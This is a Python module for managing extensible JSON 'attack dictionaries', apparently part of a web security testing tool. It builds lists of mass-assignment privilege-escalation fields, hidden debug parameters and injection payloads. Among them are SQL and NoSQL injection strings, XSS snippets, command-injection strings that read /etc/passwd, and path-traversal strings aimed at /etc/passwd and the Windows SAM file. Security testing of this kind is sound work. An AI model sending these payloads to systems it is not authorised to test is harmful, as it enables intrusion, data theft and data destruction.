"""
Dictionary Manager - Extensible dictionary system
Allows users to add/extend attack dictionaries
"""
import json
import os
from datetime import datetime
from typing import Dict, List, Any, Optional


class DictionaryManager:
    """
    Manages extensible dictionaries for attacks
    Supports user-provided extensions and persistence
    """

    def __init__(self, base_dict_path: str = './dictionaries'):
        self.base_path = base_dict_path
        self.dictionaries: Dict[str, Dict] = {}
        self.custom_extensions: Dict[str, Dict] = {}
        self._ensure_directories()

    def _ensure_directories(self):
        """Ensure dictionary directories exist"""
        os.makedirs(self.base_path, exist_ok=True)
        os.makedirs(os.path.join(self.base_path, 'custom'), exist_ok=True)
        os.makedirs(os.path.join(self.base_path, 'generated'), exist_ok=True)

    def load_dictionary(self, name: str) -> Optional[Dict]:
        """Load a dictionary by name"""
        paths = [
            os.path.join(self.base_path, 'custom', f'{name}.json'),
            os.path.join(self.base_path, 'generated', f'{name}.json'),
            os.path.join(self.base_path, f'{name}.json')
        ]

        for path in paths:
            if os.path.exists(path):
                with open(path, 'r') as f:
                    self.dictionaries[name] = json.load(f)
                    return self.dictionaries[name]

        return None

    def save_dictionary(self, name: str, data: Dict, dict_type: str = 'custom'):
        """Save dictionary to file"""
        if dict_type == 'custom':
            path = os.path.join(self.base_path, 'custom', f'{name}.json')
        elif dict_type == 'generated':
            path = os.path.join(self.base_path, 'generated', f'{name}.json')
        else:
            path = os.path.join(self.base_path, f'{name}.json')

        with open(path, 'w') as f:
            json.dump(data, f, indent=2, default=str)

        print(f"[DictionaryManager] Saved {name} to {path}")

    def create_base_dictionaries(self):
        """Create base attack dictionaries"""

        # Mass Assignment dictionary
        mass_assignment_dict = {
            'metadata': {
                'name': 'mass_assignment',
                'description': 'Dangerous parameters for privilege escalation',
                'version': '1.0',
                'created_at': datetime.now().isoformat()
            },
            'keys': {
                'is_admin': {
                    'type': 'bool',
                    'dangerous_values': [True, 1, 'true', 'True', 'yes'],
                    'description': 'Admin flag',
                    'severity': 'CRITICAL'
                },
                'admin': {
                    'type': 'bool',
                    'dangerous_values': [True, 1, 'true', 'admin'],
                    'description': 'Admin status',
                    'severity': 'CRITICAL'
                },
                'role': {
                    'type': 'string',
                    'dangerous_values': ['admin', 'administrator', 'superuser', 'root', 'sysadmin'],
                    'description': 'User role',
                    'severity': 'CRITICAL'
                },
                'permissions': {
                    'type': 'array',
                    'dangerous_values': [['*'], ['admin'], ['all'], ['read', 'write', 'delete']],
                    'description': 'Permission array',
                    'severity': 'HIGH'
                },
                'privilege': {
                    'type': 'int',
                    'dangerous_values': [99, 100, 999, 9999],
                    'description': 'Privilege level',
                    'severity': 'HIGH'
                },
                'access_level': {
                    'type': 'int',
                    'dangerous_values': [10, 99, 100, 999],
                    'description': 'Access control level',
                    'severity': 'HIGH'
                },
                'is_superuser': {
                    'type': 'bool',
                    'dangerous_values': [True, 1, 'true'],
                    'description': 'Superuser flag',
                    'severity': 'CRITICAL'
                },
                'superuser': {
                    'type': 'bool',
                    'dangerous_values': [True, 1, 'true'],
                    'description': 'Superuser status',
                    'severity': 'CRITICAL'
                },
                'credits': {
                    'type': 'int',
                    'dangerous_values': [999999, 1000000, 2147483647],
                    'description': 'User credits/balance',
                    'severity': 'MEDIUM'
                },
                'balance': {
                    'type': 'float',
                    'dangerous_values': [999999.99, 1000000.00, 999999999.99],
                    'description': 'Account balance',
                    'severity': 'HIGH'
                },
                'premium': {
                    'type': 'bool',
                    'dangerous_values': [True, 1, 'true'],
                    'description': 'Premium status',
                    'severity': 'MEDIUM'
                },
                'verified': {
                    'type': 'bool',
                    'dangerous_values': [True, 1, 'true'],
                    'description': 'Verification status',
                    'severity': 'MEDIUM'
                },
                'approved': {
                    'type': 'bool',
                    'dangerous_values': [True, 1, 'true'],
                    'description': 'Approval status',
                    'severity': 'MEDIUM'
                }
            },
            'extensible': True
        }

        self.save_dictionary('mass_assignment', mass_assignment_dict, 'generated')

        # Hidden Parameters dictionary
        hidden_params_dict = {
            'metadata': {
                'name': 'hidden_parameters',
                'description': 'Common hidden/debug parameters',
                'version': '1.0',
                'created_at': datetime.now().isoformat()
            },
            'parameters': {
                'debug': ['true', 'True', '1', 'on', 'yes'],
                'test': ['true', 'True', '1', 'on'],
                'admin': ['true', 'True', '1', 'on'],
                'dev': ['true', 'True', '1', 'on'],
                'trace': ['true', 'True', '1', 'on'],
                'verbose': ['true', 'True', '1', '2', '3'],
                'show_errors': ['true', 'True', '1'],
                'stack_trace': ['true', 'True', '1'],
                'internal': ['true', 'True', '1'],
                'testing': ['true', 'True', '1'],
                'override': ['true', 'True', '1'],
                'bypass': ['true', 'True', '1'],
                'force': ['true', 'True', '1'],
                'superuser': ['true', 'True', '1'],
                'root': ['true', 'True', '1']
            },
            'extensible': True
        }

        self.save_dictionary('hidden_parameters', hidden_params_dict, 'generated')

        # Injection Payloads dictionary
        injection_dict = {
            'metadata': {
                'name': 'injection_payloads',
                'description': 'Common injection vectors',
                'version': '1.0',
                'created_at': datetime.now().isoformat()
            },
            'sqli': [
                "' OR '1'='1",
                "' OR 1=1--",
                "admin'--",
                "' UNION SELECT NULL--",
                "1' AND '1'='1",
                "' OR 'x'='x",
                "'; DROP TABLE users--"
            ],
            'nosqli': [
                {"$ne": None},
                {"$ne": ""},
                {"$gt": ""},
                {"$regex": ".*"},
                {"$where": "1==1"}
            ],
            'xss': [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "javascript:alert(1)",
                "<svg onload=alert(1)>",
                "'-alert(1)-'"
            ],
            'command': [
                "; ls -la",
                "| whoami",
                "`id`",
                "$(cat /etc/passwd)",
                "&& dir",
                "|| echo vulnerable"
            ],
            'path_traversal': [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "....//....//....//etc/passwd",
                "../../../../../../../../../../etc/passwd"
            ],
            'extensible': True
        }

        self.save_dictionary('injection_payloads', injection_dict, 'generated')

        print("[DictionaryManager] Base dictionaries created")

    def extend_dictionary(self, name: str, extensions: Dict[str, Any]) -> Dict:
        """
        Extend existing dictionary with custom data
        """
        dictionary = self.load_dictionary(name)

        if not dictionary:
            print(f"[DictionaryManager] Dictionary {name} not found, creating new")
            dictionary = {
                'metadata': {
                    'name': name,
                    'created_at': datetime.now().isoformat(),
                    'extensible': True
                }
            }

        # Track extension
        if 'extensions' not in dictionary:
            dictionary['extensions'] = []

        # noinspection PyUnresolvedReferences
        dictionary['extensions'].append({
            'timestamp': datetime.now().isoformat(),
            'items_added': len(extensions)
        })

        # Merge extensions
        for key, value in extensions.items():
            if key in dictionary:
                # Merge if both are dicts
                if isinstance(dictionary[key], dict) and isinstance(value, dict):
                    dictionary[key].update(value)
                # Extend if both are lists
                elif isinstance(dictionary[key], list) and isinstance(value, list):
                    # noinspection PyUnresolvedReferences
                    dictionary[key].extend(value)
                else:
                    dictionary[key] = value
            else:
                dictionary[key] = value

        # Save extended dictionary as custom
        self.save_dictionary(name, dictionary, 'custom')

        return dictionary

    def import_from_file(self, file_path: str, name: Optional[str] = None):
        """Import custom dictionary from file"""
        with open(file_path, 'r') as f:
            data = json.load(f)

        if not name:
            name = os.path.splitext(os.path.basename(file_path))[0]

        self.save_dictionary(name, data, 'custom')
        print(f"[DictionaryManager] Imported {name} from {file_path}")

    def export_to_file(self, name: str, output_path: str):
        """Export dictionary to file"""
        dictionary = self.load_dictionary(name)

        if not dictionary:
            print(f"[DictionaryManager] Dictionary {name} not found")
            return

        with open(output_path, 'w') as f:
            json.dump(dictionary, f, indent=2, default=str)

        print(f"[DictionaryManager] Exported {name} to {output_path}")

    def list_dictionaries(self) -> Dict[str, List[str]]:
        """List all available dictionaries"""
        result = {
            'custom': [],
            'generated': [],
            'base': []
        }

        for dict_type in result.keys():
            path = os.path.join(self.base_path, dict_type) if dict_type != 'base' else self.base_path
            if os.path.exists(path):
                files = [f[:-5] for f in os.listdir(path) if f.endswith('.json')]
                result[dict_type] = files

        return result

    def get_dictionary_info(self, name: str) -> Optional[Dict]:
        """Get metadata about a dictionary"""
        dictionary = self.load_dictionary(name)

        if not dictionary:
            return None

        metadata = dictionary.get('metadata', {})

        return {
            'name': name,
            'description': metadata.get('description', 'No description'),
            'version': metadata.get('version', 'unknown'),
            'created_at': metadata.get('created_at', 'unknown'),
            'extensible': dictionary.get('extensible', False),
            'total_keys': len([k for k in dictionary.keys() if k not in ['metadata', 'extensible', 'extensions']]),
            'extensions_count': len(dictionary.get('extensions', []))
        }

    def merge_dictionaries(self, dict_names: List[str], output_name: str):
        """Merge multiple dictionaries into one"""
        merged = {
            'metadata': {
                'name': output_name,
                'description': f'Merged from: {", ".join(dict_names)}',
                'created_at': datetime.now().isoformat(),
                'source_dictionaries': dict_names
            }
        }

        for name in dict_names:
            dictionary = self.load_dictionary(name)
            if dictionary:
                for key, value in dictionary.items():
                    if key == 'metadata':
                        continue
                    if key in merged:
                        # Merge logic
                        if isinstance(merged[key], dict) and isinstance(value, dict):
                            merged[key].update(value)
                        elif isinstance(merged[key], list) and isinstance(value, list):
                            merged[key].extend(value)
                    else:
                        merged[key] = value

        self.save_dictionary(output_name, merged, 'custom')
        print(f"[DictionaryManager] Merged {len(dict_names)} dictionaries into {output_name}")

        return merged
